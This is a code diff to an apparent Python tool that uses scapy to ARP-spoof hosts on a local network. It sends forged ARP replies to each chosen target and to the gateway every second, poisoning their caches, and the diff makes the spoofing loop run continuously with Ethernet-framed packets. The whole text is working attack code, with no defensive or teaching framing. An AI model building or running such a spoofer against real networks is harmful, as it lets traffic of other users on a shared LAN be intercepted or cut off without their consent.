@@ -66,30 +66,22 @@ def host_by_ip(ip: str):
     except:
         return "unknown"
 
-def spoof(timeout):
+def spoof():
     global thread_stop, spoof_list
-    counter = 0
     try:
 
-        sleep(timeout)
-
         while not thread_stop:
-            if counter < 9:
-                sl = spoof_list.copy()
-                for target_ip in sl:
-                    target_mac = spoof_list[target_ip]
-                    spoof_mac = spoof_list["gateway"]
-                    spoof_ip = ".".join(target_ip.split(".")[:-1])+".1"
-                    packet_to_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-                    packet_to_router = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
-                    if target_ip in all_ip:
-                        print(f"Spoof {target_ip}")
-                        scapy.send(packet_to_target, verbose=False)
-                        scapy.send(packet_to_router, verbose=False)
-                sleep(1)
-            else:
-                counter = 0
-                sleep(timeout)
+            sl = spoof_list.copy()
+            for target_ip in sl:
+                target_mac = spoof_list[target_ip]
+                spoof_mac = spoof_list["gateway"]
+                spoof_ip = ".".join(target_ip.split(".")[:-1])+".1"
+                packet_to_target = scapy.Ether(dst=spoof_mac) / scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+                packet_to_router = scapy.Ether(dst=target_mac) / scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
+                if target_ip in all_ip:
+                    print(f"Spoof {target_ip}")
+                    scapy.sendp([packet_to_target, packet_to_router])
+            sleep(1)
 
     except KeyboardInterrupt:
         thread_stop = True
@@ -104,9 +96,12 @@ async def main():
     all_ip = list(filter(None, all_ip))
     for idx, ip in enumerate(all_ip, 1):
         print(f"{idx}. {ip} -- {host_by_ip(ip)}")
-    ignore = [all_ip[int(i)-1] for i in input("Enter ip to ignore: ").split()]
-    timeout = int(input("Enter timeout: "))
-    spoofer = threading.Thread(target=spoof, daemon=True, args=(timeout,))
+    ignore = [ip]
+    ignore.extend([all_ip[int(i)-1] for i in input("Enter ip to ignore: ").split()])
+
+    sleep(int(input("Enter timeout: ") or "0"))
+    
+    spoofer = threading.Thread(target=spoof, daemon=True)
     spoofer.start()
     spoof_list.update({"gateway": get_mac(f"{mask}.1")})
     while True:
